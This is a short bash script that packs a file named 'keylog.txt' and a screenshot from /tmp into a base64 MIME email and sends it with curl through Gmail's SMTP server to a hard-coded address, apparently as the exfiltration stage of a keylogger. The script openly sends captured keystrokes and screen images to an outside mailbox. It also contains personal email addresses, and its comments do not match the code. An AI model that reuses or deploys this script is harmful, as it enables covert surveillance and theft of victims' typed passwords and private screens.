#!/bin/bash

rtmp_url="smtp://smtp.gmail.com:465"
rtmp_from="hieunguyenptit1997@gmail.com"
rtmp_to="nguyenhieuptit1997@gmail.com"
rtmp_credentials="hieunguyenptit1997@gmail.com:xxx"

file_upload="data.txt"

echo "From: Some Name <$rtmp_from>
To: Some Name <$rtmp_to>
Subject: example of mail
Reply-To: Some Name <$rtmp_from>
Cc: 
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary=\"MULTIPART-MIXED-BOUNDARY\"

--MULTIPART-MIXED-BOUNDARY
Content-Type: multipart/alternative; boundary=\"MULTIPART-ALTERNATIVE-BOUNDARY\"

--MULTIPART-ALTERNATIVE-BOUNDARY
Content-Type: text/plain; charset=utf-8
Content-Transfer-Encoding: base64
Content-Disposition: inline

This is an email example. This is text/plain content inside the mail.
--MULTIPART-ALTERNATIVE-BOUNDARY--
--MULTIPART-MIXED-BOUNDARY
Content-Type: application/octet-stream
Content-Transfer-Encoding: base64
Content-Disposition: attachment; filename=\"keylog.txt\"" > "$file_upload"

# convert file.rar to base64 and append to the upload file
cat keylog.txt | base64 >> "$file_upload"

echo "--MULTIPART-MIXED-BOUNDARY
Content-Type: application/octet-stream
Content-Transfer-Encoding: base64
Content-Disposition: attachment; filename=\"/tmp/screenshot\"" >> "$file_upload"

# convert file.zip to base64 and append to the upload file
cat /tmp/screenshot| base64 >> "$file_upload"

# end of uploaded file
echo "--MULTIPART-MIXED-BOUNDARY--" >> "$file_upload"

# send email
echo "sending ...."
curl -s "$rtmp_url" --ssl-reqd \
     --mail-from "$rtmp_from" \
     --mail-rcpt "$rtmp_to" \
     --user "$rtmp_credentials" \
     -T "$file_upload" -k --anyauth
res=$?
if test "$res" != "0"; then
   echo "sending failed with: $res"
else
    echo "OK"
fi

